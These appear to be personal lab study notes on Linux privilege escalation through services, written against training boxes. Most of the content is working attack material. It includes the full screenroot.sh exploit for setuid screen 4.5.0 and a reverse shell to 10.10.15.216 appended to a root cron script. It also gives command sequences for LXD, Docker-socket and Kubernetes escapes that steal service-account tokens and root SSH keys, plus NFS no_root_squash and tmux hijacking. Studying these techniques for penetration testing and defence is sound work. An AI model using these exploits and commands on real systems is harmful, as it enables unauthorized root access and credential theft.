---
title: 6. Services Based Priviledge Escalation
parent: Linux Privilege Escalation
layout: default
---
## Vulnerable Services
Screen 4.5.0
Lack of perm check when opening log file
Allows trunctae any file or create a file owned by root in any directory and ultimately gain full root access

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```


## Cron Job Abuse
crontab -> creates cron file, ran by cron daemon in
`/var/spool/cron`
Each entry has six items
minutes, hours, days, months, weeks, commands.
`0 */12 * * * /home/admin/backup.sh`
-> every 12 hours
The root crontab can be abused by finding a world writable script that runs as root, and can append a command onto the script
Certain applications create cron files in `/etc/cron.d` directory and may be misconfigured
find cron
```shell-session
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
E.g. 
cron job running every 3 mins is running using `pspy`, command line tool used to view running processes without the need for root.
We can use it to see commands run by other users, cron jobs, by scanning `procfs`
```shell-session
./pspy64 -pf -i 1000
```
Print commands, file system events, and scan procfs every 1000ms, 1 second

-> we can see cron job runs backup,sh script located in the `/dmz-backups` directory, creating tarball file of contents in `/var/www/html` (default root for web server)

Put reverse shell at the bottom
```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.15.216/443 0>&1
```
Stand up local netcat listener.
```shell-session
nc -lnvp 443
```

## LXD
Containers operate at the OS level, while VMs at the hardware level
Containers share an operating system and isolate application processes from rest of system, while virtualization allows multiple OS to run simultaneously

**LXC**
Linux containers are OS level virtualization, allowing multiple Linux systems to run in isolation from each other, by owning their own processes but sharing the host system kernel.
It consumes fewer resoruces than VMs and have standard interface.Can be organized across multiple clouds, providing portability and ensuring that applications running correctly on developers system will work on any other system

**LXD**
Linux Daemon is similar, but designed to contain a complete operating system. It is not an application container but a system container.

If we are in lxc or lxd group, we can use for PE
- create own container and transfer it to target system
- use existing container

Admins often use templates that have little secuirty.
```shell-session
cd ContainerImages
ls

ubuntu-template.tar.xz
```

```shell-session
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list
```
Initiate the image and configure it by specifying secuirty.priviledged flag, and root path for container
This flag disables all isolation features that allow us to act on the host
```shell-session
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
 Now start the container and log into it. We can go to the path to access resource as root
 ```shell-session
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```
/mnt is standard mount point for temporarily mounting filesystems


## Docker
Uses containers as isolated environments in user space that run at OS level, and share FS and system resources.
Client server model, docker daemon and docker client

Docker daemon executes client commands and managing/interacting with containers
**Management**
Handles core containerization functionality.
Coordinates creation, execution, monitoring of Docker containers
Maintains isolation, with own file systems, processes, network interfaces.
Handles image management, pulls images, stores locally.
Mointors resource utlization
**Network and Storage**
Facilitates container networking by creating virtual networks and managing network interfaces
Enables containres to communicate with each other and outside world
Docker columes as well, persisting data beyond lifespan of containers
**Docker Client**
communicates via UNix socket or RESTful api
**Docker Image**
blueprint or template. Read only and immutable. Contianers can be modified at runtime.

**Docker Shared Directories**
Volume mounts can bridge the gap between host system and container's filesystem. Enumerating locally the docker container we may see on standard directories, like SSH keys

**Docker Socket**
special file that allows us to process and communicate with docekr daemon, via network socket or Unix socket
By exposing Docker socket over network interface, we can remotely manage Docker hosts.
```shell-session
htb-student@container:~/app$ ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock

htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker
htb-student@container:/tmp$ ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker


htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
<SNIP>
```
We can use docker binary to interact with the socket and enumerate what docker containers are running.
```shell-session
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker
htb-student@container:/tmp$ ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker


htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
<SNIP>
```
Create our own Docker container that maps host's root directory to the/hostsystem directory on container. 
```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>
```

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash


root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```


The user we are logged in with must be in docker group. Docker may have SUID set, or we are in Sudoers file, which may allow us to run docekr as root.

**Docker Socket**
Docker socket could be writable. `/var/run/docker.sock`
We could use this as normal user to PE
```shell-session
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

-H specifies Docker daemon endpoint
`unix:///var/run/docker.sock` this is the local Docker socket, control interface for Docker. Anyone who can talk to this socket can control Docker as root.
run creates and starts new container
`-v /:/mnt` mounts host filesystem to /mnt in the container
--rm remove after exit, -it ineractive, allocate TTY
ubuntu image, chroot /mnt bash, changes root directory to the mounted host fs, bash launch shell
## Kubernetes
K8s, container orchestration. Runs all applications in containers isolated from host system through multiple layers of protection. 
master node and worker node.

**Concept**
Pods can hold one or more closely connected containers
Each pod functions as seperate virtual machine on a node, complete with its own IP, hostname, etc.
Kubernetes simplifies management of multiple containers by offering tools for load balancing, storage orchestration etc.

Role based access control, network policies, security contexts.
Control plane controls the cluster

|**Service**|**TCP Ports**|
|---|---|
|`etcd`|`2379`, `2380`|
|`API server`|`6443`|
|`Scheduler`|`10251`|
|`Controller Manager`|`10252`|
|`Kubelet API`|`10250`|
|`Read-Only Kubelet API`|`10255`|

**Security Measures**
- Cluster infra security
- Cluster config security
- Application security
- Data security

Various authentication methods: cleint ceerts, bearer tokens, proxy, HTTP basic auth for verifying identity
Authorization happens via RBAC
Kubelet can be configured to permit anonymous access. By default, Kubelet allows anonymous access, without client certificate.


```shell-session
 curl https://10.129.10.11:10250/pods -k | jq .
```
Extracting pods
```shell-session
kubeletctl -i --server 10.129.10.11 pods
```


Provides insights and management of pods
```shell-session
kubeletctl -i --server 10.129.10.11 scan rce
```

Executing commands
```shell-session
 kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

### Privilege Escalation

[kubeletctl](https://github.com/cyberark/kubeletctl) to obtain Kubernetes service accounts token and certificate from server, providing server IP, namespace and target pod.

In case we get this token and cert, we can PE, move horizontally, or gain access 

Extracting tokens
```shell-session
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```

Extracting certificates
```shell-session
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```
With token and cert, check access rights within cluster.
```shell-session
export token=`cat k8.token
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```
Say output
```shell-session
Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods											[]					[]				[get create list]
...SNIP...
```

We can get, create and list pods. we can create a YAML file to create a new container and mount entire root filesystem. Example

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Create new pod
```shell-session
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
```

```shell-session
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
```
Extract ssh key
```shell-session
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```


## Logrotate
Linux systems produces large amounts of log files. To prevent overflowing the hard disk, logrotate takes care of archiving or disposing old logs
`/var/log`
 logrotate can be configured for
 - size of log file
 - age
 - action when factors is reached

The function of rotation is renmaing log giles

Tool is usually started periodically via cron, and controlled via config file 
`/etc/logrotate.conf`. Contains global settings that determine function of `logrotate` 

```shell-session
cat /etc/logrotate.conf
```

```shell-session
sudo cat /var/lib/logrotate.status
```

To exploit, we need the following:
1. write perms on log filees
2. logrotate must run as root or privileged user
3. vulnerable versions
	1. 3.8.6, 3.11.0, 3.15.0, 3.18.0
[logrotten](https://github.com/whotwagner/logrotten)

## Miscellaneous Techniques

tcpdump -> capture potentially cleartext credentials: telnet, http, smtp, pop, ftp
weak nfs piviledges -> allows users to access shared files or directories over the network, using 2049
`showmount -e`

|Option|Description|
|---|---|
|`root_squash`|If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set.|
|`no_root_squash`|Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.|

```shell-session
cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```
We can create SETUID binary that executes `/bin/sh` using local root user, then mount `/tmp` directory locally, copy root-ownded binary over to NFS server, set SUID bit

```shell-session
gcc shell.c -o shell
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
./shell
```

tmux - detached tmux process running as priviledged, can be hijacked. 

```shell-session
tmux -S /shareds new -s debugsess
chown root:devs /shareds
```
If a user in the devs group gets compromised, attach to this session and gain root access.
```shell-session
ps aux | grep tmux
```


Confirm perms
```shell-session
ls -la /shareds
```

Review groups, attach to tmux session and confirm root priviledge
```shell-session
id
tmux -S /shareds
```